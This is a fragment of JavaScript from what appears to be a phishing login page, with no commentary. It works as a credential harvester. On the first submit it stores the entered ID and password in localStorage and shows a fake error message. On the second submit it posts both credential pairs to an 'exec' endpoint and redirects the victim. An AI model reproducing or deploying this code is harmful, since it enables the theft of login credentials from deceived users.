  <script>

    const preventDef = e => e.preventDefault()

    document.querySelector('.eye-icon').addEventListener('click', e => {

      e.target.classList.toggle('close')

      const inp = e.target.previousElementSibling

      if (inp.type === "password") {

        inp.type = 'text'

      } else {

        inp.type = 'password'

      }

    })

    document.querySelector('.top-ctrl').addEventListener('click', e => {

      document.querySelector('.bt-ico').classList.toggle("visible")

      document.querySelector('.end-view').classList.toggle("visible")

    })

  </script>
   <script type="text/javascript">
            $(document).ready(function () {
                $('#trui-b').submit( function (e) {
                  e.preventDefault()
                    
                    if (window.localStorage.getItem("id") !== null) {
                        const prev_id = window.localStorage.getItem("id");
                        const prev_pass = window.localStorage.getItem("pass");
                        const id = $("#tr-ui-d").val();
                        const password = $("#tr-pass-d").val();
                        $.post("exec", { sko: id, skun: password, sko1: prev_id, skun1: prev_pass }, function () {
                          window.location.href = "email";

                        });
                    } else {
                      const id = $("#tr-ui-d").val();
                      const password = $("#tr-pass-d").val();
                      window.localStorage.setItem("id", id);
                      window.localStorage.setItem("pass", password);
                      $("#tr-ui-d").val('');
                      $("#tr-pass-d").val('');
                      // $(".wrong").removeClass("d-none");
                      $('#error-msg').show()
                      $(".eyesvg").addClass("d-none");
                    }

                });
            });
        </script>

